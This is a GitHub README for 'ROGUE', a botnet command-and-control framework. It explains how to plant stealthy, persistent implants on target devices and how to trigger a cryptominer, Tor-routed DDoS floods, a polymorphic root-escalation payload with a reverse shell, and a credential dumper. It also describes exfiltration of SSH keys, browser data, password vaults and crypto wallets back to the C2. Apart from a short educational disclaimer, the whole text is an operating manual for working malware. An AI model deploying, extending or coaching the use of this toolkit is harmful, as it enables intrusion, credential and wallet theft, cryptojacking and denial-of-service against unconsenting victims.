# r0gue

![rogue banner](https://github.com/user-attachments/assets/7dd2e5a3-398a-4487-a46b-541673b0f3b3)

ROGUE is a customizable, educational & manually-deployed command-and-control (C2) botnet framework built for secure multi-device orchestration.  
It supports encrypted communication using AES, with optional peer-to-peer fallback if the primary C2 is unreachable.  
ROGUE supports implants on Linux, Raspberry Pi, Termux (Android), and iOS environments.  
This botnet is intended as a learning tool.  
It comes with real-world ideas and examples to inspire tinkering, experimentation, and growth.  
Have fun.

---

## Installation

To clone ROGUE from your Kali system, run:

```bash
git clone https://github.com/ekomsSavior/rogue.git
cd rogue
````

Install dependencies manually:

```bash
sudo apt update
sudo apt install python3 
sudo apt install python3-pycryptodome  
```

---

## File Structure

* `rogue_c2.py` – Encrypted command-and-control server

* `rogue_implant.py` – Bot implant for manual deployment with trigger handling, payload loader, and stealth logic

* `payloads/` – Folder containing executable modules such as:

  * `mine.py`: Real CPU-based cryptocurrency miner
  * `ddos.py`: Threaded DDoS engine with HTTP, TCP SYN, and UDP floods. now with continuous mode xo.
  * `polyroot.py`: Privilege escalation and root persistence payload (see below)

---

## Usage

Before you start, create a 16 byte key, save it, and update `rogue_c2.py` and `rogue_implant.py` to reflect that key across all bots and servers.

---

### Start the C2 Server

```bash
python3 rogue_c2.py
```

---

### Deploy a Bot Implant

1. Copy `rogue_implant.py` to the target device
2. Edit the `C2_HOST` and `PAYLOAD_REPO` variables to match your C2 server
3. Run the implant:

```bash
python3 rogue_implant.py
```

The implant will:

* Connect to the C2 server using AES-encrypted channels
* Attempt peer-to-peer fallback if the main C2 is unreachable
* Stealth itself with fake process names and hidden payloads
* Persist by injecting into `.bashrc`

---

### Host Payloads

```bash
cd payloads/
python3 -m http.server 8000
```

---

## Command Syntax

Once bots are connected to the C2:

### Core Commands

```text
load_payload <payload_name>
run_payload <payload_name>
```

Example:

```text
load_payload mine.py
run_payload mine.py
```

---

### Reverse Shell

```text
reverse_shell
```

Then start listener:

```bash
nc -lvnp 9001
```

---

### Trigger Commands

```text
trigger_mine
trigger_stopmine
trigger_ddos
trigger_polyroot
trigger_exfil <default|deep|/path>
trigger_dumpcreds
```

These will instruct all bots to fetch and execute the specified payload or internal logic automatically.

---

### Manual Example

```bash
run_payload ddos.py trigger_ddos 192.168.0.99 80 60 150 http
```

---

### DDoS Modes

| Mode | Description     |
| ---- | --------------- |
| http | HTTP GET flood  |
| udp  | UDP packet spam |
| tcp  | TCP SYN flood   |

---

## Credential Dumper 

The `trigger_dumpcreds` command is handled **inside the implant itself**, not as an external payload.

```bash
trigger_dumpcreds
```

### What it collects:

* `/etc/passwd`
* `/etc/shadow` (if readable)
* `.bash_history`
* `.ssh/known_hosts`

These are zipped, AES-encrypted, and streamed back to the C2 server.
They are auto-decrypted and saved as:

```bash
exfil_dec_<ip>_<timestamp>_creds.zip
```

This is ideal for credential hygiene testing, password auditing, and simulating lateral recon behavior.

---

### Exfiltration Modes

ROGUE includes encrypted file and folder exfiltration using AES-secured zip archives. Output is auto-decrypted by the C2 and saved with timestamps.

| Command                     | Description                                                   |
| --------------------------- | ------------------------------------------------------------- |
| trigger\_exfil default      | Exfiltrates: `Documents`, `Downloads`, `Pictures`, `Desktop`  |
| trigger\_exfil deep         | Exfiltrates hidden targets like `.ssh`, browser data, wallets |
| trigger\_exfil /custom/path | Exfiltrates any specified file or folder                      |

#### Deep Exfil includes filtered files:

* `~/.ssh`, `~/.gnupg`, `~/.mozilla`, `~/.config/google-chrome`
* `~/.wallets`, `~/.config/BraveSoftware`
* File extensions: `.db`, `.sqlite`, `.zip`, `.kdbx`, `.csv`, `.json`, `.bak`

Decrypted output is saved by the C2 to:

```bash
exfil_dec_<ip>_<timestamp>.zip
```

---

## New Payload: `polyroot.py`

`polyroot.py` is a stealth root escalation payload that:

* Attempts to escalate privileges on Linux targets using common misconfigs
* Uses polymorphic wrapper logic to evade static detection
* Drops itself as a hidden `.update`, `.svc`, or `.cache` file
* Optionally installs via cron or LFI-staged loader
* Reports success back to C2 with real-time output

---

## Polyroot Reverse Shell Behavior

When `polyroot.py` executes successfully and root escalation is achieved, it:

* Drops a polymorphic SUID payload
  
* Attempts to initiate a root reverse shell connection back to the Rogue C2

The C2 IP is taken from the environment variable `ROGUE_C2_HOST` (or defaults to `127.0.0.1`)

The callback connects to port `9001`

Tip: Always start a listener before triggering the payload:

```bash
nc -lvnp 9001
```

---

### Polyroot Commands

```text
trigger_polyroot
```

Or manually:

```text
load_payload polyroot.py
run_payload polyroot.py
```

Rename payload for stealth:

```bash
mv polyroot.py .update
load_payload .update
run_payload .update
```

Best served over port 8000 like other payloads.

---

## Maintaining Bots

* Implants require Python3 and network access
* C2 must be running to receive connections
* Payload server must stay online
* You can add more modules inside `payloads/` and call them using `load_payload` + `run_payload`

---

## Payload Details

### `mine.py`

* Monero miner with thread config
* Supports pool/wallet input
* Edit with your Cakewallet address. get cakewallet here https://cakewallet.com/

### `ddos.py`

* Supports HTTP, TCP SYN, UDP
* Includes Tor routing (set `USE_TOR = True`) see steps below for tor instructions.
* Threaded with flood duration control

### `polyroot.py`

* Attempts root escalation
* Evades detection with polymorphic obfuscation
* Can persist with cron
* Optional `.update` or `.svc` stealth names
* Ready for future USB payload chains

---

## Testing Payload Access

From bot:

```bash
curl http://<C2_IP>:8000/polyroot.py
```

Or renamed:

```bash
curl http://<C2_IP>:8000/.svc
```

---

## Tor Support (DDoS Only)

Install and start Tor:

```bash
sudo apt install tor
pip3 install pysocks
sudo systemctl start tor@default
```

Then run:

```bash
python3 ddos.py trigger_ddos <target> <port> <duration> <threads> <mode>
```

---

## Extending Rogue

* Add signed commands
* Auto-updating implants
* Domain fronting (Ngrok, Cloudflare Workers)
* Discord-based command channels
* Add support for Windows
* Write implant in C

---

## Legal Disclaimer

This project is for **educational purposes only**.
You are responsible for your own usage.
Never use ROGUE on systems you do not **own or have permission** to test.
All code is provided as-is, without warranty or support.

![rogue banner](https://github.com/user-attachments/assets/f07a8780-9551-4eda-8dd1-bb797d1d08b9)

